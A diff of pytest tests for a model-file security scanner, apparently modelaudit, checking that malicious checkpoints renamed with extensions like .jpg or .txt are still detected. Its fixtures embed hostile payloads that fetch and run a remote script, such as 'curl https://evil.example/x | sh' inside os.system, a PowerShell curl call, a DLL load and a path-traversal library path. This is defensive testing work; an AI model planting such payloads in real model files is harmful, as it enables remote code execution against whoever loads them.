@@ -2,19 +2,86 @@
 
 import bz2
 import gzip
+import importlib
 import json
 import lzma
 import pickle
+import struct
+import sys
 import tarfile
 import tempfile
 import zipfile
+from collections.abc import Callable
 from pathlib import Path
+from typing import cast
 
 import pytest
 
+from modelaudit import core as core_module
 from modelaudit.core import _is_huggingface_cache_file, determine_exit_code, scan_file, scan_model_directory_or_file
-from modelaudit.utils.file.detection import LLAMAFILE_ROUTE_SCAN_BYTES, LLAMAFILE_ROUTE_TAIL_SCAN_BYTES
+from modelaudit.utils.file import detection as file_detection
+from modelaudit.utils.file.detection import (
+    FLAX_MSGPACK_STRUCTURE_READ_BYTES,
+    JAX_JSON_CHECKPOINT_STRUCTURE_READ_BYTES,
+    LLAMAFILE_ROUTE_SCAN_BYTES,
+    LLAMAFILE_ROUTE_TAIL_SCAN_BYTES,
+    MXNET_SYMBOL_SIGNATURE_READ_BYTES,
+    SAFETENSORS_ROUTING_HEADER_PARSE_BYTES,
+)
 from modelaudit.utils.file.filtering import _ZIP_MEMBER_SNIFF_LIMIT
+from modelaudit.utils.tensorflow_compat import has_tensorflow_protobuf_stubs as _has_tf_protos
+from tests.helpers import (
+    create_mock_mxnet_symbol,
+    create_mock_onnx,
+    prefix_mock_onnx_with_unknown_field,
+    prefix_mock_onnx_with_unknown_group,
+)
+
+
+def _require_tf_protos() -> None:
+    if not _has_tf_protos():
+        pytest.skip("TensorFlow protobuf stubs unavailable")
+
+
+def _build_malicious_tf_metagraph() -> bytes:
+    _require_tf_protos()
+    import modelaudit.protos  # noqa: F401
+
+    meta_graph_pb2 = importlib.import_module("tensorflow.core.protobuf.meta_graph_pb2")
+    metagraph = meta_graph_pb2.MetaGraphDef()
+    metagraph.meta_info_def.meta_graph_version = "modelaudit_directory_route_test"
+    node = metagraph.graph_def.node.add()
+    node.name = "pyfunc_node"
+    node.op = "PyFunc"
+    node.attr["func"].s = b"python -c 'import os; os.system(\"curl https://evil.example/x | sh\")'"
+    return cast(bytes, metagraph.SerializeToString())
+
+
+def _build_malicious_tf_savedmodel() -> bytes:
+    _require_tf_protos()
+    import modelaudit.protos  # noqa: F401
+
+    saved_model_pb2 = importlib.import_module("tensorflow.core.protobuf.saved_model_pb2")
+    saved_model = saved_model_pb2.SavedModel()
+    saved_model.saved_model_schema_version = 1
+    metagraph = saved_model.meta_graphs.add()
+    node = metagraph.graph_def.node.add()
+    node.name = "pyfunc_node"
+    node.op = "PyFunc"
+    return cast(bytes, saved_model.SerializeToString())
+
+
+def _write_sparse_oversized_safetensors_candidate(path: Path) -> None:
+    header_len = SAFETENSORS_ROUTING_HEADER_PARSE_BYTES + 1
+    with path.open("wb") as handle:
+        handle.write(struct.pack("<Q", header_len))
+        handle.write(b"{")
+        handle.truncate(8 + header_len + 1)
+
+
+def _printable_unknown_proto_prefix(min_bytes: int) -> bytes:
+    field = b"z " + (b"x" * 32)
+    return field * ((min_bytes // len(field)) + 1)
 
 
 def _corrupt_zip_member_crc(path: Path, member_name: str) -> None:
@@ -44,6 +111,25 @@ def _corrupt_zip_member_crc(path: Path, member_name: str) -> None:
         central_offset = name_end + extra_length + comment_length
 
     path.write_bytes(data)
+
+
+def _write_malicious_cntk(path: Path, include_structure: bool = True) -> None:
+    prefix = b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02\x12\x09\x0a\x03uid\x12\x02ab"
+    structure = b" CompositeFunction primitive_functions " if include_structure else b""
+    payload = b" native_user_function loadlibrary C:\\temp\\evil.dll powershell -c curl http://evil.example/p.sh "
+    path.write_bytes(prefix + structure + payload)
+
+
+def _write_malicious_lightgbm(path: Path, valid: bool = True) -> None:
+    body = "tree=0\nversion=v4\nnum_class=1\n"
+    if valid:
+        body += (
+            "num_tree_per_iteration=1\nmax_feature_idx=2\ntree_sizes=12\nnum_leaves=2\n"
+            "split_feature=0\nleaf_value=0.1 0.2\n"
+            "metadata=os.system('curl https://collector.evil.example/payload.sh | sh')\n"
+            "callback_url=https://collector.evil.example/payload.sh\n"
+        )
+    path.write_text(body, encoding="utf-8")
 
 
 class TestDirectoryFileFiltering:
@@ -219,6 +305,398 @@ class TestDirectoryFileFiltering:
         assert results["files_scanned"] == 1
         assert any("payload.jpg" in (issue.location or "") for issue in results.issues)
 
+    def test_disguised_oversized_safetensors_with_skipped_extension_fails_closed(
+        self,
+        tmp_path: Path,
+        monkeypatch: pytest.MonkeyPatch,
+    ) -> None:
+        disguised_payload = tmp_path / "weights.jpg"
+        _write_sparse_oversized_safetensors_candidate(disguised_payload)
+        from modelaudit.scanners.safetensors_scanner import SafeTensorsScanner
+
+        monkeypatch.setattr(
+            SafeTensorsScanner,
+            "calculate_file_hashes",
+            lambda _self, _path: pytest.fail("oversized SafeTensors headers must fail before hashing"),
+        )
+        monkeypatch.setattr(
+            core_module,
+            "_calculate_file_hash",
+            lambda _path: pytest.fail("oversized SafeTensors directory entries must fail before dedup hashing"),
+        )
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 1
+        assert "safetensors" in results.scanner_names
+        assert results["success"] is False
+        assert determine_exit_code(results) == 2
+        assert any(check.name == "Header Size Limit" for check in results.checks)
+
+    def test_disguised_malicious_jax_json_checkpoint_is_scanned_without_ajax_near_match(self, tmp_path: Path) -> None:
+        """Directory scans should preserve JAX metadata content but not `ajax` lookalikes."""
+        payload = "jax.experimental.host_callback.call(os.system, 'id')"
+        (tmp_path / "payload.jpg").write_text(
+            (" " * 1024) + json.dumps({"framework": "jax", "payload": payload}),
+            encoding="utf-8",
+        )
+        (tmp_path / "ajax.jpg").write_text(
+            json.dumps({"framework": "ajax", "payload": payload}),
+            encoding="utf-8",
+        )
+
+        results = scan_model_directory_or_file(str(tmp_path))
+
+        assert results["files_scanned"] == 1
+        assert "jax_checkpoint" in results.scanner_names
+        assert determine_exit_code(results) == 1
+        assert any(issue.message.startswith("Suspicious pattern in JSON checkpoint") for issue in results.issues)
+
+    def test_oversized_disguised_jax_json_checkpoint_fails_closed_after_late_identity(self, tmp_path: Path) -> None:
+        """Directory filtering should preserve bounded JAX identity routing for large JSON."""
+        padding = "x" * (JAX_JSON_CHECKPOINT_STRUCTURE_READ_BYTES + 16)
+        (tmp_path / "payload.jpg").write_text(json.dumps({"padding": padding, "framework": "jax"}), encoding="utf-8")
+        (tmp_path / "ajax.jpg").write_text(json.dumps({"padding": padding, "framework": "ajax"}), encoding="utf-8")
+
+        results = scan_model_directory_or_file(str(tmp_path))
+
+        assert results["files_scanned"] == 1
+        assert "jax_checkpoint" in results.scanner_names
+        assert results.success is False
+        assert determine_exit_code(results) == 2
+
+    def test_large_disguised_malicious_flax_msgpack_with_later_root_is_scanned(self, tmp_path: Path) -> None:
+        """Directory scans should preserve renamed MessagePack checkpoints for Flax analysis."""
+        msgpack = pytest.importorskip("msgpack")
+        disguised_payload = tmp_path / "payload.jpg"
+        disguised_payload.write_bytes(
+            msgpack.packb(
+                {
+                    "metadata": "x" * (FLAX_MSGPACK_STRUCTURE_READ_BYTES + 100),
+                    "params": {"w": [1, 2, 3]},
+                    "__reduce__": "os.system",
+                },
+                use_bin_type=True,
+            )
+        )
+
+        results = scan_model_directory_or_file(str(tmp_path))
+
+        assert results["files_scanned"] == 1
+        assert "flax_msgpack" in results.scanner_names
+        assert determine_exit_code(results) == 1
+        assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in results.issues)
+
+    def test_disguised_flax_msgpack_stream_with_malicious_trailing_object_is_scanned(self, tmp_path: Path) -> None:
+        msgpack = pytest.importorskip("msgpack")
+        disguised_payload = tmp_path / "stream.jpg"
+        disguised_payload.write_bytes(
+            msgpack.packb({"params": {"w": [1, 2, 3]}}, use_bin_type=True)
+            + msgpack.packb({"__reduce__": "os.system"}, use_bin_type=True)
+        )
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 1
+        assert "flax_msgpack" in results.scanner_names
+        assert determine_exit_code(results) == 1
+        assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in results.issues)
+
+    def test_disguised_flax_msgpack_stream_with_later_checkpoint_object_is_scanned(self, tmp_path: Path) -> None:
+        msgpack = pytest.importorskip("msgpack")
+        disguised_payload = tmp_path / "stream-later-root.jpg"
+        disguised_payload.write_bytes(
+            msgpack.packb({"metadata": {"producer": "flax"}}, use_bin_type=True)
+            + msgpack.packb({"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"}, use_bin_type=True)
+        )
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 1
+        assert "flax_msgpack" in results.scanner_names
+        assert determine_exit_code(results) == 1
+        assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in results.issues)
+
+    def test_disguised_flax_msgpack_stream_with_leading_scalar_object_is_scanned(self, tmp_path: Path) -> None:
+        msgpack = pytest.importorskip("msgpack")
+        disguised_payload = tmp_path / "stream-leading-scalar.jpg"
+        disguised_payload.write_bytes(
+            msgpack.packb(None, use_bin_type=True)
+            + msgpack.packb({"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"}, use_bin_type=True)
+        )
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 1
+        assert "flax_msgpack" in results.scanner_names
+        assert determine_exit_code(results) == 1
+        assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in results.issues)
+
+    def test_disguised_flax_msgpack_stream_with_xml_looking_scalar_is_scanned(self, tmp_path: Path) -> None:
+        msgpack = pytest.importorskip("msgpack")
+        disguised_payload = tmp_path / "xml-looking-scalar.txt"
+        disguised_payload.write_bytes(
+            msgpack.packb(60, use_bin_type=True)
+            + msgpack.packb({"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"}, use_bin_type=True)
+        )
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 1
+        assert "flax_msgpack" in results.scanner_names
+        assert determine_exit_code(results) == 1
+        assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in results.issues)
+
+    @pytest.mark.parametrize("suffix", [".txt", ".md", ".markdown", ".rst", ".ini", ".cfg", ".toml", ".conf"])
+    def test_disguised_flax_msgpack_under_default_skipped_suffix_is_scanned(
+        self,
+        tmp_path: Path,
+        suffix: str,
+    ) -> None:
+        msgpack = pytest.importorskip("msgpack")
+        disguised_payload = tmp_path / f"stream{suffix}"
+        disguised_payload.write_bytes(
+            msgpack.packb({"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"}, use_bin_type=True)
+        )
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 1
+        assert "flax_msgpack" in results.scanner_names
+        assert determine_exit_code(results) == 1
+        assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in results.issues)
+
+    def test_oversized_plain_text_document_suffix_fails_closed_in_directory_scan(self, tmp_path: Path) -> None:
+        document = tmp_path / "notes.txt"
+        document.write_bytes(b" " * (2 * (FLAX_MSGPACK_STRUCTURE_READ_BYTES + 1) + 2))
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 1
+        assert "flax_msgpack" in results.scanner_names
+        assert determine_exit_code(results) == 2
+
+    def test_small_plain_text_document_remains_skipped_in_directory_scan(self, tmp_path: Path) -> None:
+        document = tmp_path / "notes.txt"
+        document.write_text("ordinary project documentation\n", encoding="utf-8")
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 0
+        assert "flax_msgpack" not in results.scanner_names
+
+    def test_large_json_array_under_skipped_suffix_is_scanned_fail_closed(self, tmp_path: Path) -> None:
+        json_array = tmp_path / "metadata.jpg"
+        json_array.write_bytes(b"[" + b"0," * ((MXNET_SYMBOL_SIGNATURE_READ_BYTES // 2) + 100) + b"0]")
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 1
+        assert "flax_msgpack" in results.scanner_names
+        assert determine_exit_code(results) == 2
+
+    @pytest.mark.parametrize("suffix", [".jpg", ".txt"])
+    def test_scalar_padded_disguised_flax_stream_fails_closed_at_analysis_limit(
+        self, tmp_path: Path, suffix: str
+    ) -> None:
+        msgpack = pytest.importorskip("msgpack")
+        disguised_payload = tmp_path / f"stream-scalar-padding{suffix}"
+        disguised_payload.write_bytes(
+            msgpack.packb(None, use_bin_type=True) * 4097
+            + msgpack.packb({"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"}, use_bin_type=True)
+        )
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 1
+        assert "flax_msgpack" in results.scanner_names
+        assert determine_exit_code(results) == 2
+        assert any("Msgpack stream object count exceeds configured limit" in issue.message for issue in results.issues)
+
+    def test_disguised_flax_state_wrapper_with_malicious_attribute_is_scanned(self, tmp_path: Path) -> None:
+        msgpack = pytest.importorskip("msgpack")
+        disguised_payload = tmp_path / "state-wrapper.jpg"
+        disguised_payload.write_bytes(
+            msgpack.packb(
+                {"state": {"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"}},
+                use_bin_type=True,
+            )
+        )
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 1
+        assert "flax_msgpack" in results.scanner_names
+        assert determine_exit_code(results) == 1
+        assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in results.issues)
+
+    def test_disguised_flax_msgpack_without_optional_dependency_is_not_skipped(
+        self,
+        tmp_path: Path,
+        monkeypatch: pytest.MonkeyPatch,
+    ) -> None:
+        disguised_payload = tmp_path / "model.jpg"
+        disguised_payload.write_bytes(b"\x81\xa6params\x81\xa1w\x93\x01\x02\x03")
+        monkeypatch.setattr("modelaudit.scanners.flax_msgpack_scanner.HAS_MSGPACK", False)
+        monkeypatch.setitem(sys.modules, "msgpack", None)
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 1
+        assert "flax_msgpack" in results.scanner_names
+        assert determine_exit_code(results) == 1
+
+    def test_ambiguous_disguised_flax_msgpack_probe_limit_fails_closed_in_directory_scan(self, tmp_path: Path) -> None:
+        msgpack = pytest.importorskip("msgpack")
+        ambiguous_payload = tmp_path / "ambiguous.jpg"
+        large_metadata: dict[str, object] = {f"field{i}": i for i in range(2100)}
+        large_metadata["blob"] = "x" * (FLAX_MSGPACK_STRUCTURE_READ_BYTES + 100)
+        ambiguous_payload.write_bytes(
+            msgpack.packb({"metadata": large_metadata, "state": {"selected": True}}, use_bin_type=True)
+        )
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 1
+        assert "flax_msgpack" in results.scanner_names
+        assert results.file_metadata[str(ambiguous_payload)]["scan_outcome"] == "inconclusive"
+        assert determine_exit_code(results) == 2
+
+    @pytest.mark.parametrize("filename", ["payload.jpg", "payload.py", "payload.pyw"])
+    def test_disguised_malicious_tf_metagraph_with_skipped_extension_is_scanned(
+        self,
+        tmp_path: Path,
+        filename: str,
+    ) -> None:
+        disguised_payload = tmp_path / filename
+        disguised_payload.write_bytes(b"\xa2\x06\x80\x08" + (b"x" * 1024) + _build_malicious_tf_metagraph())
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 1
+        assert "tf_metagraph" in results.scanner_names
+        assert determine_exit_code(results) == 1
+        assert any(issue.message == "Dangerous TensorFlow operation: PyFunc" for issue in results.issues)
+
+    @pytest.mark.parametrize("filename", ["saved.jpg", "saved.py", "saved.pyw"])
+    def test_disguised_malicious_tf_savedmodel_with_skipped_extension_is_scanned(
+        self,
+        tmp_path: Path,
+        filename: str,
+    ) -> None:
+        disguised_payload = tmp_path / filename
+        disguised_payload.write_bytes(_build_malicious_tf_savedmodel())
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 1
+        assert "tf_savedmodel" in results.scanner_names
+        assert determine_exit_code(results) == 1
+        assert any("PyFunc operation detected" in issue.message for issue in results.issues)
+
+    @pytest.mark.parametrize(
+        ("filename", "payload", "expected_scanner"),
+        [
+            ("prefixed-graph.jpg", _build_malicious_tf_metagraph, "tf_metagraph"),
+            ("prefixed-saved.jpg", _build_malicious_tf_savedmodel, "tf_savedmodel"),
+        ],
+    )
+    def test_printable_prefixed_malicious_tf_payload_with_skipped_extension_is_scanned(
+        self,
+        tmp_path: Path,
+        monkeypatch: pytest.MonkeyPatch,
+        filename: str,
+        payload: Callable[[], bytes],
+        expected_scanner: str,
+    ) -> None:
+        monkeypatch.setattr(file_detection, "JAX_JSON_CHECKPOINT_ROUTING_READ_BYTES", 64)
+        disguised_payload = tmp_path / filename
+        disguised_payload.write_bytes(_printable_unknown_proto_prefix(65) + payload())
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 1
+        assert expected_scanner in results.scanner_names
+        assert determine_exit_code(results) == 1
+
+    def test_budget_prefixed_malicious_tf_payload_with_skipped_extension_fails_closed(
+        self,
+        tmp_path: Path,
+        monkeypatch: pytest.MonkeyPatch,
+    ) -> None:
+        monkeypatch.setattr(file_detection, "_TF_METAGRAPH_MAX_ROUTING_FIELDS", 2)
+        disguised_payload = tmp_path / "budget-prefixed.jpg"
+        disguised_payload.write_bytes(
+            b"{" + (b"\x18\x00" * 3) + b"|" + b"z\x09\x81\xa6params\x80" + _build_malicious_tf_metagraph()
+        )
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 1
+        assert "tf_metagraph" in results.scanner_names
+        assert determine_exit_code(results) == 1
+        assert any(issue.message == "Dangerous TensorFlow operation: PyFunc" for issue in results.issues)
+
+    def test_prefixed_disguised_malicious_onnx_with_skipped_extension_is_scanned(self, tmp_path: Path) -> None:
+        pytest.importorskip("onnx")
+        disguised_payload = create_mock_onnx(tmp_path / "payload.jpg", op_type="PythonOp")
+        prefix_mock_onnx_with_unknown_field(disguised_payload, value_size=0, count=4097, field_number=8)
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 1
+        assert "onnx" in results.scanner_names
+        assert determine_exit_code(results) == 1
+        assert any(issue.details.get("op_type") == "PythonOp" for issue in results.issues)
+
+    def test_group_budget_prefixed_malicious_onnx_with_skipped_extension_is_scanned(self, tmp_path: Path) -> None:
+        pytest.importorskip("onnx")
+        disguised_payload = create_mock_onnx(tmp_path / "group-payload.jpg", op_type="PythonOp")
+        prefix_mock_onnx_with_unknown_group(disguised_payload)
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 1
+        assert "onnx" in results.scanner_names
+        assert determine_exit_code(results) == 1
+        assert any(issue.details.get("op_type") == "PythonOp" for issue in results.issues)
+
+    def test_disguised_cntk_with_skipped_extension_is_scanned(self, tmp_path: Path) -> None:
+        disguised_payload = tmp_path / "cntk.jpg"
+        _write_malicious_cntk(disguised_payload)
+
+        results = scan_model_directory_or_file(str(tmp_path))
+
+        assert results["files_scanned"] == 1
+        assert "cntk" in results.scanner_names
+        assert any(issue.severity.value == "critical" for issue in results.issues)
+
+    def test_disguised_cntk_near_match_remains_skipped(self, tmp_path: Path) -> None:
+        near_match = tmp_path / "cntk-near-match.jpg"
+        _write_malicious_cntk(near_match, include_structure=False)
+
+        results = scan_model_directory_or_file(str(tmp_path))
+
+        assert results["files_scanned"] == 0
+
+    def test_disguised_lightgbm_with_skipped_extension_is_scanned(self, tmp_path: Path) -> None:
+        disguised_payload = tmp_path / "lightgbm.jpg"
+        _write_malicious_lightgbm(disguised_payload)
+
+        results = scan_model_directory_or_file(str(tmp_path))
+
+        assert results["files_scanned"] == 1
+        assert "lightgbm" in results.scanner_names
+        assert any(issue.severity.value == "critical" for issue in results.issues)
+
+    def test_disguised_lightgbm_near_match_remains_skipped(self, tmp_path: Path) -> None:
+        near_match = tmp_path / "lightgbm-near-match.jpg"
+        _write_malicious_lightgbm(near_match, valid=False)
+
+        results = scan_model_directory_or_file(str(tmp_path))
+
+        assert results["files_scanned"] == 0
+
     @pytest.mark.parametrize("filename", [".payload", "Makefile", "package.json", "CHANGELOG"])
     def test_disguised_pickle_with_default_hidden_or_basename_skip_is_scanned(
         self,
@@ -247,6 +725,43 @@ class TestDirectoryFileFiltering:
         """Content sniffing should not promote ordinary media files into the scan set."""
         image_path = tmp_path / "cover.jpg"
         image_path.write_bytes(b"\xff\xd8\xff\xe0" + b"jpeg")
+
+        results = scan_model_directory_or_file(str(tmp_path))
+
+        assert results["files_scanned"] == 0
+
+    def test_disguised_malicious_mxnet_symbol_with_skipped_extension_is_scanned(self, tmp_path: Path) -> None:
+        """Directory scans should preserve renamed MXNet symbol graphs for analysis."""
+        disguised_symbol = create_mock_mxnet_symbol(
+            tmp_path / "model.jpg",
+            custom_library="../../tmp/libevil.so",
+        )
+
+        results = scan_model_directory_or_file(str(tmp_path))
+
+        assert results["files_scanned"] == 1
+        assert "mxnet" in results.scanner_names
+        assert any(str(disguised_symbol) in (issue.location or "") for issue in results.issues)
+
+    def test_disguised_torch7_with_skipped_extension_is_scanned(self, tmp_path: Path) -> None:
+        """Directory scans should preserve signature-valid Torch7 payloads despite misleading suffixes."""
+        disguised_torch7 = tmp_path / "payload.jpg"
+        disguised_torch7.write_bytes(
+            b"4\n1\n3\nV 1\n13\nnn.Sequential\n"
+            b"4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
+            b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
+        )
+
+        results = scan_model_directory_or_file(str(tmp_path))
+
+        assert results["files_scanned"] == 1
+        assert "torch7" in results.scanner_names
+        assert any("payload.jpg" in (issue.location or "") for issue in results.issues)
+
+    def test_disguised_torch_source_near_match_remains_skipped(self, tmp_path: Path) -> None:
+        """Source files naming torch modules must not route as serialized Torch7."""
+        source_near_match = tmp_path / "source.jpg"
+        source_near_match.write_text("import torch\nimport torch.nn as nn\n\nclass Model(nn.Module):\n    pass\n")
 
         results = scan_model_directory_or_file(str(tmp_path))
 
